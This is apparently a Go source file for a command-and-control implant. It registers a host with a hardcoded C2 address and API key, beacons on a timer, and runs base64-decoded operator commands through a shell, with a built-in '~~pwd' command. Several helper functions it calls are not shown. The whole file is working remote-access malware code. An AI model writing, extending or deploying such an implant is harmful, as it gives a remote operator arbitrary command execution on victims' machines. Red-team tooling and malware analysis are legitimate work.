package main

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"
)

type API_Device struct {
	Id                    int    `json:"id"`
	Hostname              string `json:"hostname"`
	InternalIp            string `json:"internal_ip"`
	ExternalIp            string `json:"external_ip"`
	Mac                   string `json:"mac"`
	Domain                string `json:"domain"`
	Username              string `json:"username"`
	Pid                   int    `json:"pid"`
	Os                    string `json:"os"`
	Arch                  string `json:"arch"`
	BeaconPeriod          int    `json:"beacon_period"`
	BeaconJitter          int    `json:"beacon_jitter"`
	BeaconTimestampLast   int    `json:"beacon_timestamp_last"`
	BeaconTimestampJoined int    `json:"beacon_timestamp_joined"`
}

type API_Command struct {
	Id        int     `json:"id"`
	ConsoleId int     `json:"consoleid"`
	Timestamp float32 `json:"timestamp"`
	Request   string  `json:"request"`
	Response  string  `json:"response"`
	Status    string  `json:"status"`
}

const apiVersion string = "1.0.0"
const apiKey string = "7aae81bf48f3ade70fea5e3b3cad583b107dba65"

var c2url string = ""

func main() {
	// TODO: take c2url from cli flag
	c2url = "http://192.168.2.21"

	run()
}

func run() {
	apiDevice := register(c2url)
	done := false
	for !done {
		apiCommand := request(apiDevice)
		if apiCommand != nil {
			runCommand(apiCommand, apiDevice)
		}
		time.Sleep(time.Duration(apiDevice.BeaconPeriod) * time.Millisecond)
	}
}

func runCommand(apiCommand *API_Command, apiDevice *API_Device) {
	cmdBytes, err := base64.StdEncoding.DecodeString(apiCommand.Request)
	if err != nil {
		fmt.Println(err)
	}
	cmd := string(cmdBytes)
	if cmd[:2] != "~~" {
		shellExec(cmd, apiCommand)
	} else {
		switch cmdArgs := strings.Split(cmd, " "); {
		case cmdArgs[0] == "~~pwd":
			output := pwdExec(cmdArgs)
			response(output, apiCommand, apiDevice)
		}
	}
}
